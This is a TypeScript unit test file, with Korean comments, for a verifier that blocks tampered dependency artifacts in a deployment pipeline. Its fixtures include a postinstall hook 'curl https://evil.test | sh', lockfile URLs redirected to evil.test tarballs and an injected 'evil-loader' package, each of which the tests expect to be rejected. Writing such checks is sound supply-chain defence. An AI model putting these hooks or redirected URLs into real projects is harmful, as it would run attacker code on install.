import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { beforeEach, describe, expect, it } from "vitest";

/**
 * `scripts/propagate/verify-artifact.mjs` 단위 시험 — 2026-09-08 2차 리뷰 F4(P1).
 *
 * ★이 대조기가 막는 사고: 준비 job 에서는 **앱 코드가 돈다**(npm 스크립트·설계 등록부 생성기와
 *  그 의존성). 그 코드는 산출물 폴더를 마음대로 고칠 수 있는데, `verify-lock` 은 「핀이 새 SHA 인가」만
 *  보므로 아래가 전부 그냥 통과했다:
 *    · `package.json` 에 `postinstall` 을 끼워 넣기 → Railway 가 설치할 때 그 명령이 돈다
 *    · 잠금 파일의 `resolved` 를 **남의 tgz 주소**로 바꾸기 → 우리 코드 대신 남의 코드가 깔린다
 *    · 잠금 파일에 처음 보는 꾸러미 항목을 더하기 → 앱에 모르는 꾸러미가 들어온다
 *
 * ★판정 방식: 「나쁜 목록」이 아니라 **「기준 파일 + 핀 한 줄」과 깊은 비교**다.
 *  그래서 아직 상상 못 한 변조도 「기준과 다르다」로 걸린다. 시험도 그 성질을 재도록,
 *  정상 통과 1건 옆에 서로 다른 방식의 변조 5건을 둔다.
 */

const HERE = dirname(fileURLToPath(import.meta.url));
const SCRIPT = resolve(HERE, "../verify-artifact.mjs");
const REPO = "smlee-hash/wedly-policy-match-shared";
const NAME = "@wedly/policy-match-shared";
const OLD = "e7d0ed8fe9428b1c720f2f5675cd29a39e99e9b1";
const NEW = "b404b4b1f44d0ffb8213fff771a0bec090ca6257";
const SPEC = (sha: string) => `github:${REPO}#${sha}`;
const RESOLVED = (sha: string) => `git+ssh://git@github.com/${REPO}.git#${sha}`;
const ERP_PATHS = ["package.json", "package-lock.json", "src/lib/design-system/registry.generated.json"];

type Json = Record<string, unknown>;

/** 앱 저장소의 기준 파일 모양(ERP 를 줄여 놓은 것) */
function basePkg(): Json {
  return {
    name: "wedly-erp",
    scripts: { build: "npm run design:check && next build", "design:check": "node scripts/design-system/cli.mjs check" },
    dependencies: { next: "16.2.12", [NAME]: SPEC(OLD) },
  };
}

function baseLock(): Json {
  return {
    name: "wedly-erp",
    lockfileVersion: 3,
    packages: {
      "": { name: "wedly-erp", dependencies: { next: "16.2.12", [NAME]: SPEC(OLD) } },
      "node_modules/next": { version: "16.2.12", resolved: "https://registry.npmjs.org/next/-/next-16.2.12.tgz", integrity: "sha512-next" },
      [`node_modules/${NAME}`]: { version: "0.1.0", resolved: RESOLVED(OLD), integrity: "sha512-old" },
    },
  };
}

function write(dir: string, rel: string, body: string) {
  mkdirSync(dirname(join(dir, rel)), { recursive: true });
  writeFileSync(join(dir, rel), body);
}

const j = (v: unknown) => JSON.stringify(v, null, 2) + "\n";

interface ArtifactOpts {
  pkg?: (p: Json) => void;
  lock?: (l: Json) => void;
  registry?: string;
  extraFiles?: Record<string, string>;
  paths?: string[];
}

/** 기준 폴더와 「핀만 올린」 산출물 폴더를 만든 뒤, 산출물만 요청대로 비튼다 */
function fixture(tmp: string, opts: ArtifactOpts = {}) {
  const base = join(tmp, `base-${Math.random().toString(36).slice(2)}`);
  const art = join(tmp, `art-${Math.random().toString(36).slice(2)}`);
  mkdirSync(base, { recursive: true });
  mkdirSync(art, { recursive: true });

  write(base, "package.json", j(basePkg()));
  write(base, "package-lock.json", j(baseLock()));
  write(base, "src/lib/design-system/registry.generated.json", j({ pin: SPEC(OLD) }));

  // 봇이 정상적으로 만들었을 산출물(= 핀 한 줄만 새 SHA)
  const pkg = basePkg();
  (pkg.dependencies as Json)[NAME] = SPEC(NEW);
  const lock = baseLock();
  ((lock.packages as Json)[""] as Json).dependencies = { next: "16.2.12", [NAME]: SPEC(NEW) };
  (lock.packages as Json)[`node_modules/${NAME}`] = { version: "0.1.0", resolved: RESOLVED(NEW), integrity: "sha512-new" };

  opts.pkg?.(pkg);
  opts.lock?.(lock);
  write(art, "package.json", j(pkg));
  write(art, "package-lock.json", j(lock));
  write(art, "src/lib/design-system/registry.generated.json", opts.registry ?? j({ pin: SPEC(NEW) }));
  write(art, "meta.json", j({ app: "erp", result: "prepared" }));
  for (const [rel, body] of Object.entries(opts.extraFiles ?? {})) write(art, rel, body);

  return { base, art, paths: opts.paths ?? ERP_PATHS };
}

function run(f: { base: string; art: string; paths: string[] }, sha = NEW) {
  const r = spawnSync("node", [SCRIPT, f.base, f.art, sha, ...f.paths], { encoding: "utf8" });
  return { code: r.status, out: r.stdout, err: r.stderr };
}

describe("verify-artifact.mjs", () => {
  let tmp: string;
  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "verify-artifact-"));
  });

  it("핀 한 줄만 바뀐 산출물은 0 — 대조기가 늘 빨간 것이 아니라는 확인", () => {
    const r = run(fixture(tmp));
    expect(r.code, r.err).toBe(0);
    expect(r.out).toContain("OK");
  });

  it("package.json 에 postinstall 을 끼워 넣으면 1 — Railway 가 그 명령을 돌리기 전에 막는다", () => {
    const r = run(fixture(tmp, { pkg: (p) => ((p.scripts as Json).postinstall = "curl https://evil.test | sh") }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/postinstall/);
    expect(r.err).toMatch(/기준에 없는 칸/);
  });

  it("잠금 파일의 resolved 가 남의 주소면 1 — 우리 저장소의 그 커밋만 받는다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)[`node_modules/${NAME}`] as Json).resolved = "https://evil.test/pkg.tgz";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/resolved 가 우리 저장소의 그 커밋이 아닙니다/);
  });

  it("잠금 파일 integrity 가 sha512 가 아니면 1", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)[`node_modules/${NAME}`] as Json).integrity = "sha1-짧음";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/integrity 가 sha512 가 아닙니다/);
  });

  it("잠금 파일에 모르는 꾸러미 항목이 더해지면 1 — 무엇이 늘었는지 함께 알린다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          (l.packages as Json)["node_modules/evil-loader"] = {
            version: "1.0.0",
            resolved: "https://evil.test/evil.tgz",
            integrity: "sha512-evil",
          };
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/node_modules\/evil-loader/);
  });

  it("우리 꾸러미 밖의 기존 항목을 고쳐도 1 — 「우리 자리」 말고는 아무것도 못 바꾼다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)["node_modules/next"] as Json).resolved = "https://evil.test/next.tgz";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/node_modules\/next/);
  });

  it("커밋 대상이 아닌 파일이 산출물에 섞이면 1", () => {
    const r = run(fixture(tmp, { extraFiles: { "src/몰래.ts": "export const x = 1;\n" } }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/커밋 대상이 아닌 파일/);
    expect(r.err).toMatch(/src\/몰래\.ts/);
  });

  it("설계 등록부가 깨진 JSON 이면 1", () => {
    const r = run(fixture(tmp, { registry: "{ 이건 JSON 이 아니다" }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/JSON 이 아닙니다/);
  });

  it("핀이 이번 반영 SHA 가 아니면 1 — 옛 SHA 로 되돌린 산출물도 막는다", () => {
    const f = fixture(tmp);
    const r = run(f, OLD); // 기준과 같은 옛 SHA 로 대조하면 산출물(새 SHA)이 어긋난다
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/dependencies/);
  });

  it("커밋 대상 파일이 산출물에 없으면 1", () => {
    const f = fixture(tmp);
    const r = run({ ...f, paths: [...f.paths, "src/lib/design-system/없는파일.json"] });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/커밋 대상 파일이 없습니다/);
  });

  it("검증 규칙이 없는 파일을 커밋 대상에 넣으면 1 — 모르는 파일을 조용히 통과시키지 않는다", () => {
    const f = fixture(tmp, { extraFiles: { "next.config.ts": "export default {};\n" } });
    const r = run({ ...f, paths: [...f.paths, "next.config.ts"] });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/검증 규칙이 없는 파일/);
  });

  it("인자가 모자라거나 SHA 형식이 아니면 2(사용법 오류)", () => {
    const f = fixture(tmp);
    expect(spawnSync("node", [SCRIPT, f.base, f.art, "b404b4b", ...f.paths], { encoding: "utf8" }).status).toBe(2);
    expect(spawnSync("node", [SCRIPT, f.base, f.art, NEW], { encoding: "utf8" }).status).toBe(2);
  });
});
